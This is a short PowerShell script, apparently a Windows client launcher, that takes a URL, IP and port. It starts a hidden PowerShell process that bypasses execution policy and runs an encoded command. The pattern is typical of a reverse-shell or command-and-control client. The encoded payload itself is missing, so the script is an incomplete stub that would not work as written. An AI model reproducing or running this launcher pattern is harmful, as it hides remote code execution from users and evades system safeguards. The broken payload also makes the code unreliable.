param(
    [string]$URL,
    [string]$IP,
    [string]$PORT
)

if (-not $URL -or -not $IP -or -not $PORT) {
    Write-Host "Usage: .\windows_client.ps1 <URL> <IP> <PORT>" -ForegroundColor Yellow
    exit
}

powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand  -Args $URL $IP $PORT
